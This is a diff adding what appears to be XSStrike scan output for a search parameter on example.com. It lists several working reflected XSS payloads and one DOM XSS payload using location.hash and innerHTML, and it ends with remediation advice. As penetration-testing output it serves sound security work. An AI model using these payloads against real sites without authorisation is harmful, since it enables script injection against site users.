@@ -1,0 +1,60 @@
+	XSStrike v3.1.5
+
+[~] Checking for DOM vulnerabilities
+[+] WAF Status: Offline
+[!] Testing parameter: q
+
+[~] Generating payloads from database
+[~] Analysing response for potential XSS points
+
+[+] Vulnerable parameter: q
+    Confidence: 100%
+    Context: HTML Body
+    Filtration: None
+
+[~] Generating and testing payloads
+
+[+] Payload: <script>alert(1)</script>
+    Status: VULNERABLE
+    Reflection: Direct
+    
+[+] Payload: <img src=x onerror=alert(1)>
+    Status: VULNERABLE
+    Reflection: Event Handler
+    
+[+] Payload: <svg/onload=alert(1)>
+    Status: VULNERABLE
+    Reflection: SVG Vector
+    
+[+] Payload: "><script>alert(1)</script>
+    Status: VULNERABLE
+    Reflection: Breaking out of attribute
+    
+[+] Payload: '><img src=x onerror=alert(1)>
+    Status: VULNERABLE
+    Reflection: Breaking out of single quote
+
+[~] Probing for DOM XSS
+[+] DOM XSS found!
+    Sink: innerHTML
+    Source: location.hash
+    Payload: #<img src=x onerror=alert(1)>
+
+-----------------------------------------------------------
+Summary:
+-----------------------------------------------------------
+Target: http://example.com/search.php
+Parameter: q
+Total Payloads Tested: 150
+Successful Payloads: 6
+DOM XSS Vectors: 1
+
+Vulnerability Breakdown:
+  - Reflected XSS: 5
+  - DOM-based XSS: 1
+  - Stored XSS: 0 (requires manual verification)
+
+Recommended Fixes:
+  1. Implement proper output encoding
+  2. Use Content-Security-Policy header
+  3. Sanitize user input
